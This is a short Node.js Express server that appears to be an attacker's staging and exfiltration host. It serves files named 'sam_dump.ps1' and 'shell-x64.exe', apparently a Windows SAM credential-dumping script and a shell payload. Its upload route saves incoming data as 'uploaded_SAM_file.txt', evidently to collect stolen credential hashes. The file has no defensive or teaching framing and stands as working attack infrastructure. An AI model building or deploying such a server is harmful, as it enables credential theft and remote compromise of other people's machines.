const fs = require('fs');
const morgan = require('morgan');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Define a custom token for morgan to log only the IP address
morgan.token('client-ip', function (req, res) {
  return req.ip;
});

// Logging middleware with custom token
app.use(morgan(':client-ip', { immediate: true }));

// Set up body parser middleware
app.use(bodyParser.raw({ type: '*/*' }));

app.get('/sam_dump.ps1', (req, res) => {
  res.sendFile('./sam_dump.ps1', { root: __dirname });
});

app.get('/shell-x64.exe', (req, res) => {
  res.sendFile('./shell-x64.exe', { root: __dirname });
});

// Route for handling file upload
app.post('/upload', (req, res) => {
    try {
        // Decode data from the request body
        const decodedData = req.body.toString('utf-8');
        
        // Save the decoded data to a file
        fs.writeFile('uploaded_SAM_file.txt', decodedData, (err) => {
            if (err) {
                console.error('Error saving uploaded file:', err);
                res.status(500).send('Internal Server Error');
            } else {
                console.log('File saved successfully');
                res.status(200).send('File uploaded successfully');
            }
        });
    } catch (error) {
        console.error('Error handling upload:', error);
        res.status(400).send('Bad Request');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
